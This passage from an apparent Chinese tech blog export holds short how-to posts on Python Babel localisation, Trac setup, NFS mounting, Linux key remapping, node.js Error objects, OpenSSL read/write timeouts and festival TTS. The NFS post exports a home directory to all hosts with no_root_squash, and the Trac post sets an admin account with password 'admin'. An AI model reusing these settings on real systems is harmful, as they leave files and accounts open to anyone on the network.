1.0\\n\"\n\"Content-Type: text/plain; charset=utf-8\\n\"\n\"Content-Transfer-Encoding: 8bit\\n\"\n\"Generated-By: Babel 2.0-dev\\n\"\n\n#: hello.py:1\nmsgid \"Hello\"\nmsgstr \"喂\"\n</pre>\n</li>\n\n<li>编译翻译结果\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pybabel compile -f -d ./hello.i18n    <span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">&#32534;&#35793;PO&#25991;&#20214;&#20026;MO&#25991;&#20214;</span>\n</pre>\n</div>\n</li>\n\n<li>英文环境下运行程序\n\n<pre class=\"example\">\npython ./hello.py\nHello\n</pre>\n</li>\n\n<li>中文环境下运行程序\n\n<pre class=\"example\">\nLC_ALL=zh_CN python ./hello.py\n喂\n</pre>\n</li>\n\n<li>更新 <code>hello.py</code> ，追加一句“      print _('World')”\n</li>\n\n<li>将“World”翻译成中文\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pybabel extract -F hello.babel . -o hello.i18n/messages.pot    <span style=\"color: #999999; font-style: italic;\"># </span><span style=\"color: #999999; font-style: italic;\">&#20174;&#28304;&#20195;&#30721;&#20013;&#25552;&#21462;&#21487;&#32763;&#35793;&#30340;&#25991;&#26412;&#21040;P</span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">OT&#65288;PO&#27169;&#26495;&#65289;&#25991;&#20214;</span>\npybabel update -l zh_CN -d ./hello.i18n -i ./hello.i18n/messages.pot    <span style=\"color: #999999; font-style: italic;\"># </span><span style=\"color: #999999; font-style: italic;\">&#20174;POT&#25991;&#26412;</span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">&#26356;&#26032;&#25351;&#23450;&#35821;&#35328;&#30340;PO&#25991;&#20214;</span>\n<span style=\"color: #999999; font-style: italic;\"># </span><span style=\"color: #999999; font-style: italic;\">&#24320;&#22987;&#32763;&#35793;&#25351;&#23450;&#35821;&#35328;&#30340;PO&#25991;&#20214;&#65306; hello.i18n/zh_CN/LC_MESSAGES/messages.po</span>\npybabel compile -f -d ./hello.i18n    <span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">&#32534;&#35793;PO&#25991;&#20214;&#20026;MO&#25991;&#20214;</span>\n</pre>\n</div>\n</li>\n\n<li>再次运行\n\n<pre class=\"example\">\nLC_ALL=zh_CN python ./hello.py\n喂\n世界\n</pre>\n</li>\n\n<li>程序中强制使用中文语言： <code>hello.cn.py</code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-python\"><span style=\"color: #99cc99;\">import</span> gettext\n\n<span style=\"color: #ffcc66;\">t</span> = gettext.translation(<span style=\"color: #66cccc;\">'messages'</span>, <span style=\"color: #66cccc;\">'./hello.i18n'</span>, languages=[<span style=\"color: #66cccc;\">'zh_CN'</span>])\n<span style=\"color: #ffcc66;\">_</span> = t.gettext\n\n<span style=\"color: #99cc99;\">print</span> _(<span style=\"color: #66cccc;\">'Hello'</span>)\n<span style=\"color: #99cc99;\">print</span> _(<span style=\"color: #66cccc;\">'World'</span>)\n</pre>\n</div>\n</li>\n\n<li>即使是在英文环境下也输出中文\n\n<pre class=\"example\">\nLC_ALL=en_US python ./hello.py\n喂\n世界\n</pre>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "开源项目管理系统：trac",
  "timestamp": "2014-03-10 00:44:00",
  "tags": [
    "python",
    "trac"
  ],
  "body": "<p>\n最近负责为公司搭建项目管理系统，有如下要求：\n</p>\n<ul class=\"org-ul\">\n<li>支持BUG管理\n</li>\n\n<li>支持帐号管理\n</li>\n\n<li>支持WIKI\n</li>\n\n<li>支持任务分配\n</li>\n\n<li>支持中文\n</li>\n</ul>\n\n<p>\n由于时间紧迫，感觉 <code>redmine</code> 界面更漂亮，相关资料也好找，而且帐号管理、中文支持方面的很不错，所以选择了 <code>redmine</code> 。其实心里面一直希望选的是基于 <code>python</code> 开发的系统，一方面自已喜欢 <code>python</code> ，另外团队中对 <code>python</code> 熟悉的人比较多，这样后面需要做二次开发时会容易一些。\n</p>\n\n<p>\n<code>trac</code> 给人的第一感觉是太过于简单粗糙了。界面朴实简洁尚可接受、演示站点中文化不彻底、自已安装的时候较之 <code>redmine</code> 更是磕磕绊绊。=trac= 使用 <code>Babel</code> 进行多语言支持，当前的trac稳定版（1.0）存在中文支持方面的Bug：<a href=\"http://trac.edgewall.org/ticket/10903\">Wrong `NullTranslations` class in functional tests</a> ，我在安装过程中就遇到了，正是这个问题才觉得先研究一下 <code>Babel</code> ，于是有了上一篇文章 《<a href=\"http://blog.kankanan.com/posts/2014/03/09_python5e94752856fd96455316ff1ababel.html\">python应用国际化：Babel</a>》， <code>trac</code> 下一版（1.1）对这个问题进行了修复。 网络上有很多人对 <code>trac</code> 夸赞有加，另外 <code>trac</code> 还有持续集成的插件： <a href=\"http://bitten.edgewall.org/\">Bitten</a> ， 在对 <code>Babel</code> 有一定了解后，我终于鼓气勇气研究起 <a href=\"http://trac.edgewall.org/\">trac</a> 。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">安装最新版 <code>trac</code></h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>使用学习 <code>Babel</code> 时建的虚拟环境\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">workon LearnBabel\n</pre>\n</div>\n</li>\n\n<li>从最新源代码安装 <code>trac</code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">svn checkout http://svn.edgewall.org/repos/trac/trunk trac\n<span style=\"color: #cc99cc;\">cd</span> trac\npython ./setup.py install\n</pre>\n</div>\n</li>\n\n<li>建一个项目看看效果\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">cd</span> ~/Examples/python\ntrac-admin LearnTrac initenv\ntracd --port 8080 LearnTrac &amp;\nxdg-open http://localhost:8080\n</pre>\n</div>\n</li>\n</ul>\n\n<p>\n感觉 <code>trac</code> 的中文化做得还不够彻底，但是关键的部位都已经中文化，不影响对整个系统的使用，有了 <code>Babel</code> 的经验之后对它进行中文化是很容易的，翻译后提交给 <code>trac</code> 开发人员，也算是回馈开源社区了。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">配置用户</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li>创建帐号文件 <code>LearnTrac/conf/users.digest</code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #ffcc66;\">user</span>=admin\n<span style=\"color: #ffcc66;\">realm</span>=localhost\n<span style=\"color: #ffcc66;\">password</span>=admin\n<span style=\"color: #ffcc66;\">file</span>=LearnTrac/conf/users.digest\n<span style=\"color: #cc99cc;\">echo</span> ${<span style=\"color: #ffcc66;\">user</span>}:${<span style=\"color: #ffcc66;\">realm</span>}:$(<span style=\"color: #cc99cc;\">printf</span> <span style=\"color: #66cccc;\">\"${user}:${realm}:${password}\"</span> | md5sum - | sed -<span style=\"text-decoration: underline;\">e </span><span style=\"color: #66cccc; text-decoration: underline;\">'s/\\s\\+-//'</span><span style=\"text-decoration: underline;\">) &gt;&gt; ${</span><span style=\"color: #ffcc66; text-decoration: underline;\">file</span><span style=\"text-decoration: underline;\">}</span>\n</pre>\n</div>\n</li>\n\n<li>重新启动服务\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-python\">tracd -p 8080 --<span style=\"color: #ffcc66;\">auth</span>=<span style=\"color: #66cccc;\">\"LearnTrac,LearnTrac/conf/users.digest,localhost\"</span> LearnTrac\n</pre>\n</div>\n</li>\n</ul>\n\n<p>\n现在可以使用 <code>admin</code> 帐号登录了\n</p>\n\n<p>\n帐号管理方面 <code>trac</code> 比较弱，只能通过 <code>trac-admin</code> 命令行工具来管理，小团队使用还是可以接受的，另外仅支持HTTP认证，配上HTTPS布署到外网也算是不错的选择。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">配置权限</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<ul class=\"org-ul\">\n<li>为 <code>admin</code> 用户赋予管理员权限\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-python\">trac-admin LearnTrac permission add admin TRAC_ADMIN\n</pre>\n</div>\n</li>\n</ul>\n\n<p>\n现在可以在WEB界面上看到“管理”标签页了，可以在WEB界面上对权限进行配置。</p>\n</div>\n</div>\n"
},
{
  "title": "在linux使用nfs挂载其它linux机器上的文件夹",
  "timestamp": "2014-09-23 16:52:00",
  "tags": [
    "linux",
    "nfs"
  ],
  "body": "<p>\n下面的IP地址以及工作目录需按实际情况进行修改。\n</p>\n\n<ul class=\"org-ul\">\n<li>在本地机器上允许目录被远程挂载\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">'/home/tangxinfa/workdir *(rw,sync,no_root_squash)'</span> &gt;&gt; /etc/exports\nsudo exportfs -arv\n</pre>\n</div>\n</li>\n\n<li>在远程机器上挂载本地机器上的文件夹\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mkdir /tmp/Projects; mount -t nfs -o nolock 192.168.111.100:/home/tangxinfa/Proj<span style=\"text-decoration: underline;\">ects /tmp/Projects</span>\n</pre>\n</div>\n</li>\n</ul>\n\n<p>\n问题诊断\n</p>\n\n<ul class=\"org-ul\">\n<li>mount: RPC: Unable to receive; errno = Connection refused\n\n<p>\n需要启动nfs-server服务：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo systemctl enable nfs-server.service\nsudo systemctl start nfs-server.service\n</pre>\n</div>\n\n<p>\n另外，如果刚刚做了linux内核更新而没有重启系统也可能导致这个问题，重启一下再试。\n</p>\n</li>\n\n<li>mount: 192.168.111.100:/home/tangxinfa/Projects failed, reason given by server: Permission denied\n\n<p>\n在/etc/exports文件中允许目录被远程挂载即可。</p>\n</li>\n</ul>\n"
},
{
  "title": "linux下修改键位映射",
  "timestamp": "2014-09-19 14:07:00",
  "tags": [
    "linux",
    "keyboard"
  ],
  "body": "<p>\n在linux下会大量使用ctrl和alt键，但是普通键盘上这两个键所在位置太偏，按起来非常吃力，交换键位可以很好的解决这个问题。\n</p>\n\n<ul class=\"org-ul\">\n<li>通过gnome-tweak-tool进行修改\n\n<p>\nTyping页可以完成常用的修改，如：交换Caps Lock和Ctrl，交换左Ctrl和Alt。但是在我的笔记本上设置好后有时候会失效.\n</p>\n</li>\n\n<li>通过setxkbmap命令进行修改\n\n<p>\nCaps Lock改为Ctrl：setxkbmap -option ctrl:nocaps\n</p>\n\n<p>\n可以查看/usr/share/X11/xkb/rules/evdev.lst查看支持的交换方式。Ctrl和Alt交换试了一下没有效果。\n</p>\n\n<p>\n将setxkbmap设置命令放到~/.xprofile中即可开机生效。\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>通过配置~/.Xmodmap进行修改\n\n<p>\n可以完成任意的键盘映射。\n</p>\n\n<p>\n如下所示：Caps Lock改为Ctrl，左Ctrl改为Alt：\n</p>\n\n<pre class=\"example\">\nkeycode 66 = Control_L\nclear Lock\nadd control = Control_L\n\nclear control\nclear mod1\nkeycode 37 = Alt_L Meta_L\nadd control = Control_L Control_R\nadd mod1 = Alt_L Meta_L\n</pre>\n\n<p>\n启用设置：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">xmodmap ~/.Xmodmap\n</pre>\n</div>\n\n<p>\n在~/.xprofile中添加以上指令以便开机生效：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #99cc99;\">if</span> [ -f $<span style=\"color: #ffcc66;\">HOME</span>/.Xmodmap ]; <span style=\"color: #99cc99;\">then</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   /usr/bin/xmodmap $<span style=\"color: #ffcc66;\">HOME</span>/.Xmodmap\n<span style=\"color: #99cc99;\">fi</span>\n</pre>\n</div>\n\n<p>\n参考：\n</p>\n\n<ul class=\"org-ul\">\n<li><a href=\"http://earthviaradio.wordpress.com/2012/02/06/swapping-the-left-alt-and-ctrl-keys-in-ubuntu-11-10/\">Swapping the left Alt and Ctrl keys in Ubuntu 11.10</a>\n</li>\n\n<li><a href=\"http://efod.se/writings/linuxbook/html/caps-lock-to-ctrl.html\">Changing your caps lock into Ctrl in X</a>\n</li>\n\n<li><a href=\"https://wiki.archlinux.org/index.php/Xmodmap_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)\">Xmodmap (简体中文)</a>\n</li>\n</ul>\n</li>\n\n<li>清除xmodmap以及setxkbmap的配置\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">setxkbmap -layout us\n</pre>\n</div>\n</li>\n\n<li>换hhkb pro2键盘\n\n<p>\nlinux用户必备，ctrl和alt键已经放置到最优位置，而且后面的跳线开关支持常用的键位交换，即使是linux文本模式下也可用。</p>\n</li>\n</ul>\n"
},
{
  "title": "Thinkpad T540p修复linux下触摸板按下时光标位置移动问题",
  "timestamp": "2014-09-22 14:29:00",
  "tags": [
    "linux",
    "thinkpad"
  ],
  "body": "<ul class=\"org-ul\">\n<li>执行以下设置命令即可\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">synclient <span style=\"color: #ffcc66;\">HorizHysteresis</span>=30 <span style=\"color: #ffcc66;\">VertHysteresis</span>=30\n</pre>\n</div>\n\n<p>\n将上面的命令放到~/.xprofile中，以便重启后仍然生效。\n</p>\n</li>\n</ul>\n\n<p>\n参考：<a href=\"https://blog.lnx.cx/2014/03/20/fedora-20-and-the-thinkpad-t440s-touchpad/\">Fedora 20 and the ThinkPad T440s touchpad | Technitribe</a></p>\n"
},
{
  "title": "理解node.js中的Error对象",
  "timestamp": "2014-12-09 13:38:00",
  "tags": [
    "node"
  ],
  "body": "<p>\nError对象在 <a href=\"http://nodejs.org\">node.js</a> 程序中无处不在，但是关于它在 <a href=\"http://nodejs.org/docs/latest/api/all.html\">node.js文档</a> （写这篇文章时node.js的最新版本为v0.10.33）中却找不到描述资料，只在以下部分提及：\n</p>\n\n<dl class=\"org-dl\">\n<dt> <a href=\"http://nodejs.org/docs/latest/api/all.html#all_util_iserror_object\">util.isError(object)</a> </dt><dd>判断对象是否为Error对象.\n</dd>\n\n<dt> <a href=\"http://nodejs.org/docs/latest/api/all.html#all_additions_to_error_objects\">Domain: Additions to Error objects</a> </dt><dd>在Error对象上附加额外的字段.\n</dd>\n</dl>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">Error到底是何方神圣？</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\nError对象是在ECMAScript 5.1（于2011年7月发布）中 <a href=\"http://www.ecma-international.org/ecma-262/5.1/#sec-15.11\">定义</a> 的，是一个比较新的特性：\n</p>\n\n<blockquote>\n<p>\nInstances of Error objects are thrown as exceptions when runtime errors occur. The Error objects may also serve as base objects for user-defined exception classes.\n</p>\n</blockquote>\n\n<p>\n它只有两个属性：\n</p>\n\n<dl class=\"org-dl\">\n<dt> name </dt><dd>错误名称，默认为\"Error\"\n</dd>\n\n<dt> message </dt><dd>错误消息，默认为\"\"\n</dd>\n</dl>\n\n<p>\nV8实现了一个扩展属性：\n</p>\n\n<dl class=\"org-dl\">\n<dt> stack </dt><dd>错误描述及调用堆栈 \n</dd>\n</dl>\n\n<p>\n它只有一个方法：\n</p>\n\n<dl class=\"org-dl\">\n<dt> toString </dt><dd>转成字符串形式，通常为 \"name: message\"\n</dd>\n</dl>\n\n<p>\n构造一个Error实例：\n</p>\n\n<p>\nnew Error(message) 或者 Error(message)，两者是一样的。\n</p>\n\n<p>\n示例：显示错误消息\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">console.log(err);\nconsole.log(err.toString());\nconsole.log(err.message);\n</pre>\n</div>\n\n<p>\n需要注意的是console.log(JSON.stringify(err))显示的是空对象{}.\n</p>\n\n<p>\n示例：显示错误消息及调用堆栈\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">console.log(err.stack);\n</pre>\n</div>\n\n<p>\n示例：显示错误名称\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">console.log(err.name);\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">如何自定义Error类型？</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">MyError</span>(<span style=\"color: #ffcc66;\">message</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #6699cc;\">this</span>.message = message || <span style=\"color: #66cccc;\">''</span>;\n}\n\nMyError.<span style=\"color: #6699cc;\">prototype</span> = <span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">Error</span>();\nMyError.<span style=\"color: #6699cc;\">prototype</span>.constructor = MyError;\nMyError.<span style=\"color: #6699cc;\">prototype</span>.name = <span style=\"color: #66cccc;\">'MyError'</span>;\n</pre>\n</div>\n\n<p>\nError实例类型判断\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">err</span> = <span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">Error</span>(<span style=\"color: #66cccc;\">\"this is error\"</span>);\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">myerr</span> = <span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">MyError</span>(<span style=\"color: #66cccc;\">\"this is my error\"</span>);\nerr <span style=\"color: #99cc99;\">instanceof</span> <span style=\"color: #6699cc;\">Error</span> <span style=\"color: #999999; font-style: italic;\">/*</span><span style=\"color: #999999; font-style: italic;\">true*/</span>\nerr <span style=\"color: #99cc99;\">instanceof</span> <span style=\"color: #6699cc;\">MyError</span> <span style=\"color: #999999; font-style: italic;\">/*</span><span style=\"color: #999999; font-style: italic;\">false*/</span>\nmyerr <span style=\"color: #99cc99;\">instanceof</span> <span style=\"color: #6699cc;\">MyError</span> <span style=\"color: #999999; font-style: italic;\">/*</span><span style=\"color: #999999; font-style: italic;\">true*/</span>\nmyerr <span style=\"color: #99cc99;\">instanceof</span> <span style=\"color: #6699cc;\">Error</span> <span style=\"color: #999999; font-style: italic;\">/*</span><span style=\"color: #999999; font-style: italic;\">true*/</span>\n</pre>\n</div>\n\n<p>\nstack输出有问题：自定义的错误描述没了\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">err.stack <span style=\"color: #999999; font-style: italic;\">/*</span><span style=\"color: #999999; font-style: italic;\">'Error: this is error\\n    at repl:1:11 ...*/</span>\nmyerr.stack <span style=\"color: #999999; font-style: italic;\">/*</span><span style=\"color: #999999; font-style: italic;\">'MyError\\n    at repl:1:21 ...*/</span>\n</pre>\n</div>\n\n<p>\n修复node.js下MyError的stack不正确的问题\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">MyError</span>(<span style=\"color: #ffcc66;\">message</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> Error.captureStackTrace(<span style=\"color: #6699cc;\">this</span>, <span style=\"color: #6699cc;\">this</span>.constructor)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #6699cc;\">this</span>.message = message || <span style=\"color: #66cccc;\">''</span>;\n}\n\nMyError.<span style=\"color: #6699cc;\">prototype</span> = <span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">Error</span>();\nMyError.<span style=\"color: #6699cc;\">prototype</span>.constructor = MyError;\nMyError.<span style=\"color: #6699cc;\">prototype</span>.name = <span style=\"color: #66cccc;\">'MyError'</span>;\n</pre>\n</div>\n\n<p>\n<b>最终版：更node.js化一些</b>\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">MyError</span>(<span style=\"color: #ffcc66;\">message</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (!(<span style=\"color: #6699cc;\">this</span> <span style=\"color: #99cc99;\">instanceof</span> <span style=\"color: #6699cc;\">MyError</span>)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> <span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">MyError</span>(message);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   Error.captureStackTrace(<span style=\"color: #6699cc;\">this</span>, <span style=\"color: #6699cc;\">this</span>.constructor)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">this</span>.message = message || <span style=\"color: #66cccc;\">''</span>;\n}\n\nutil.inherits(MyError, Error)\nMyError.<span style=\"color: #6699cc;\">prototype</span>.name = <span style=\"color: #66cccc;\">'MyError'</span>;\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<dl class=\"org-dl\">\n<dt> <a href=\"https://docs.nodejitsu.com/articles/errors/what-is-the-error-object\">What is the error object?</a> </dt><dd>对Error对象的成员有所提及，但与当前的node.js版本不一致。\n</dd>\n\n<dt> <a href=\"https://cnodejs.org/topic/52090bc944e76d216af25f6f\">Node.js下自定义错误类型</a> </dt><dd>教你如何自定义错误类型。\n</dd>\n\n<dt> <a href=\"http://stackoverflow.com/questions/10624873/what-properties-does-nodejs-expresss-error-object-exposes\">What properties does nodejs express's Error object exposes?</a> </dt><dd>讨论Error对象相关属性\n</dd>\n\n<dt> <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error\">MDN &gt; Web technology for developers &gt; JavaScript &gt; JavaScript reference &gt; Standard built-in objects &gt; Error</a> </dt><dd>Error对象参考文档\n</dd>\n\n<dt> <a href=\"http://www.ecma-international.org/ecma-262/5.1/#sec-15.11\">Error Objects</a> </dt><dd>Error对象标准文档\n</dd>\n</dl>\n</div>\n</div>\n"
},
{
  "title": "SSL_read及SSL_write支持超时",
  "timestamp": "2015-01-27 14:29:00",
  "tags": [
    "openssl",
    "c"
  ],
  "body": "<p>\n原始的socket编程中 <code>read</code> 、 <code>write</code> 支持超时是很容易实现的，如使用 <code>select</code> 或者 <code>setsockopt</code> 设置读写超时并在 <code>read</code> 和 <code>write</code> 出错后根据 <code>errno</code> 判断是否为超时引起。\n</p>\n\n<p>\n但是在 <code>SSL</code> 编程中对底层socket调用 <code>select</code> 以及使用 <code>errno</code> 行为是未定义的。\n</p>\n\n<p>\n使用 <code>setsockopt</code> 在底层的socket上设置读写后， <code>SSL_read</code> 、 <code>SSL_write</code> 出错会返回ssl错误码 <code>SSL_ERROR_WANT_READ</code> 或 <code>SSL_ERROR_WANT_WRITE</code> ，\n但是被信号中断或者底层SSL需要重新握手也会导致 <code>SSL_read</code> 、 <code>SSL_write</code> 返回同样的ssl错误码。\n</p>\n\n<p>\n如果能够将信号屏蔽掉，并启用SSL自动重新握手，就能够实现 <code>SSL_read</code> 、 <code>SSL_write</code> 超时检测。\n</p>\n\n<ul class=\"org-ul\">\n<li>屏蔽信号\n\n<p>\n忽略应用产生的信号，如：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\">signal(SIGPIPE, SIG_IGN);\nsignal(SIGCHLD, SIG_IGN);\n</pre>\n</div>\n</li>\n\n<li>在底层socket上设置超时\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\"><span style=\"color: #99cc99;\">struct</span> <span style=\"color: #6699cc;\">timeval</span> <span style=\"color: #ffcc66;\">tv</span>;\ntv.tv_sec  = 10;\ntv.tv_usec = 0;\nsetsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (<span style=\"color: #6699cc;\">char</span>*)&amp;tv, <span style=\"color: #99cc99;\">sizeof</span>(<span style=\"color: #99cc99;\">struct</span> <span style=\"color: #6699cc;\">timeval</span>));\nsetsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (<span style=\"color: #6699cc;\">char</span>*)&amp;tv, <span style=\"color: #99cc99;\">sizeof</span>(<span style=\"color: #99cc99;\">struct</span> <span style=\"color: #6699cc;\">timeval</span>));\n</pre>\n</div>\n</li>\n\n<li>启用自动重新握手\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\">SSL_CTX_set_mode(ctx, SSL_MODE_AUTO_RETRY);\n</pre>\n</div>\n</li>\n\n<li><code>SSL_read</code> 和 <code>SSL_write</code> 判断是否超时出错\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\"><span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">readed</span> = SSL_read(ssl, data, size);\n<span style=\"color: #99cc99;\">if</span> (readed &lt;= 0) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (SSL_get_error(ssl, readed) == SSL_ERROR_WANT_READ) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">// </span><span style=\"color: #999999; font-style: italic;\">timeout</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } <span style=\"color: #99cc99;\">else</span> {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">// </span><span style=\"color: #999999; font-style: italic;\">error</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\n\n<span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">writed</span> = SSL_write(ssl, data, size);\n<span style=\"color: #99cc99;\">if</span> (writed &lt;= 0) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (SSL_get_error(ssl, writed) == SSL_ERROR_WANT_WRITE) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">// </span><span style=\"color: #999999; font-style: italic;\">timeout</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } <span style=\"color: #99cc99;\">else</span> {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">// </span><span style=\"color: #999999; font-style: italic;\">error</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\n</pre>\n</div>\n</li>\n</ul>\n"
},
{
  "title": "Archlinux安装文本语音合成（TTS）",
  "timestamp": "2015-04-15 20:21:00",
  "tags": [
    "archlinux",
    "tts"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">安装 <code>festival</code></h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S festival festival-english festival-us\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">测试运行</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"This is an example. Arch is the best.\"</span> | festival --tts\n</pre>\n</div>\n\n<ul class=\"org-ul\">\n<li>修复错误 <code>Linux: can't open /dev/dsp</code>\n</li>\n</ul>\n\n<p>\n参考 <a href=\"https://wiki.archlinux.org/index.php/Festival#Can.27t_open_.2Fdev.2Fdsp\">这里</a> 将以下内容添加到 <code>~/.festivalrc</code>\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-lisp\">(Parameter.set 'Audio_Method 'Audio_Command)\n(Parameter.set 'Audio_Command <span style=\"color: #66cccc;\">\"aplay -q -c 1 -t raw -f s16 -r $SR $FILE\"</span>)\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n<a href=\"https://wiki.archlinux.org/index.php/Festival\">https://wiki.archlinux.org/index.php/Festival</a>\n</p>\n\n<p>\n<a href=\"https://linuxtoy.org/archives/festival_on_ubuntu.html\">https://linuxtoy.org/archives/festival_on_ubuntu.html</a></p>\n</div>\n</div>\n"
},
{
  "title": "Node.js服务器TCP死连接问题诊断",
  "timestamp": "2015-04-16 20:29:00",
  "tags": [
    "node",
    "network"
  ],
